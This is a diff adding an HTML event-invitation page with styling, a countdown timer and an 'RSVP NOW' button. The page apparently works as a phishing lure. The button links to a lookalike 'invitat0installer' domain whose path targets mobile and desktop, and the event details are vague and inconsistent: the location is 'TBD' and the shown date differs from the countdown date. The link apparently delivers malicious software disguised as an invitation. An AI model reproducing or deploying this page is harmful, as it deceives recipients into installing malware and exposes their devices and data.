@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Celebrate Life’s Beautiful Moments</title>
+
+  <!-- Font Awesome for icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      height: 100vh;
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      text-align: center;
+      font-family: "Georgia", serif;
+      color: white;
+      background: url("Background.jpg") no-repeat center center/cover;
+      position: relative;
+      overflow: hidden;
+    }
+
+    body::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.35);
+      z-index: 0;
+    }
+
+    h1 {
+      font-size: 2.8rem;
+      font-weight: 600;
+      z-index: 1;
+      text-shadow: 2px 2px 6px rgba(0, 0, 0, 0.5);
+      margin: 0 20px;
+    }
+
+    p {
+      font-size: 1.1rem;
+      margin-top: 12px;
+      z-index: 1;
+      text-shadow: 1px 1px 4px rgba(0, 0, 0, 0.4);
+      margin: 0 25px;
+      max-width: 600px;
+    }
+
+    .button {
+      margin-top: 35px;
+      background-color: #ffffff;
+      color: #333;
+      padding: 14px 34px;
+      border: none;
+      border-radius: 40px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      z-index: 1;
+      text-decoration: none;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+    }
+
+    .button:hover {
+      background-color: #f0c36d;
+      color: #fff;
+      transform: scale(1.05);
+    }
+
+    /* Countdown Styles */
+    #countdown {
+      margin-top: 25px;
+      font-size: 1rem;
+      font-weight: 500;
+      letter-spacing: 1px;
+      z-index: 1;
+      background: rgba(255, 255, 255, 0.15);
+      border-radius: 30px;
+      padding: 10px 20px;
+      backdrop-filter: blur(6px);
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+      display: inline-block;
+    }
+
+    #countdown span {
+      display: inline-block;
+      min-width: 60px;
+    }
+
+    /* Event Info Section */
+    .event-info {
+      margin-top: 40px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 60px;
+      z-index: 1;
+      flex-wrap: wrap;
+    }
+
+    .info-box {
+      text-align: center;
+    }
+
+    .info-box i {
+      font-size: 2rem;
+      color: #d6a43b;
+      margin-bottom: 10px;
+    }
+
+    .info-title {
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: #fff;
+    }
+
+    .info-detail {
+      font-size: 0.95rem;
+      color: #f5e7c5;
+      margin-top: 4px;
+    }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      h1 {
+        font-size: 2.1rem;
+      }
+
+      p {
+        font-size: 1rem;
+      }
+
+      .button {
+        padding: 12px 28px;
+        font-size: 0.95rem;
+      }
+
+      #countdown {
+        font-size: 0.95rem;
+      }
+
+      .event-info {
+        gap: 35px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      h1 {
+        font-size: 1.8rem;
+      }
+
+      p {
+        font-size: 0.9rem;
+      }
+
+      .button {
+        padding: 10px 25px;
+        font-size: 0.9rem;
+      }
+
+      #countdown {
+        font-size: 0.9rem;
+      }
+
+      .info-title {
+        font-size: 1rem;
+      }
+
+      .info-detail {
+        font-size: 0.85rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <h1>Celebrate Life’s Beautiful Moments</h1>
+  <p>Join us for an evening filled with joy, laughter, and warm memories.</p>
+  <a href="https://invitat0installer.de/bothPD/mobile&desktop.php" class="button">RSVP NOW</a>
+
+  <!-- Countdown Timer -->
+  <div id="countdown"></div>
+
+  <!-- Event Info Section -->
+  <div class="event-info">
+    <div class="info-box">
+      <i class="fa-solid fa-calendar-days"></i>
+      <div class="info-title">When</div>
+      <div class="info-detail">December 14, 2025</div>
+    </div>
+
+    <div class="info-box">
+      <i class="fa-solid fa-location-dot"></i>
+      <div class="info-title">Where</div>
+      <div class="info-detail">TBD</div>
+    </div>
+
+    <div class="info-box">
+      <i class="fa-solid fa-clock"></i>
+      <div class="info-title">Time</div>
+      <div class="info-detail">00:00 EST</div>
+    </div>
+  </div>
+
+  <script>
+    // 🎯 Set your event date here:
+    const eventDate = new Date("2025-12-25T00:00:00").getTime();
+
+    const countdown = document.getElementById("countdown");
+
+    const timer = setInterval(() => {
+      const now = new Date().getTime();
+      const distance = eventDate - now;
+
+      if (distance < 0) {
+        countdown.innerHTML = "The event has started!";
+        clearInterval(timer);
+        return;
+      }
+
+      // Time calculations
+      const months = Math.floor(distance / (1000 * 60 * 60 * 24 * 30.4375));
+      const days = Math.floor((distance % (1000 * 60 * 60 * 24 * 30.4375)) / (1000 * 60 * 60 * 24));
+      const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+      countdown.innerHTML = `
+        <span>${months} <small>mo</small></span>
+        <span>${days} <small>d</small></span>
+        <span>${hours} <small>h</small></span>
+        <span>${minutes} <small>m</small></span>
+        <span>${seconds} <small>s</small></span>
+      `;
+    }, 1000);
+  </script>
+</body>
+</html>
